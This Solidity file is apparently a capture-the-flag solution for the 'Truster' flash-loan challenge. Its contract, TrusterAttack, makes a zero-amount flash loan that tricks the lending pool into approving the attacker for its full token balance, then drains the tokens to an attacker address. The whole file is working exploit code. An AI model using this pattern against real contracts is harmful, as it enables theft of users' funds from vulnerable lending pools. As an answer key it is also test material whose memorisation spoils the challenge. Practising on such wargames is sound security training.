// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

pragma solidity ^0.8.0;

contract TrusterAttack {
	function attack(
		address attacker_address, 
		address pool_address, 
		address token_address, 
		uint256 num_tokens
	) public {
		IERC20 damnValuableToken = IERC20(token_address);
        TrusterLenderPool pool = TrusterLenderPool(pool_address);
        pool.flashLoan(0, address(this), token_address, abi.encodeWithSignature("approve(address,uint256)", address(this), num_tokens));
        damnValuableToken.transferFrom(pool_address, address(this), num_tokens);
        damnValuableToken.transfer(attacker_address, num_tokens);
	}
}
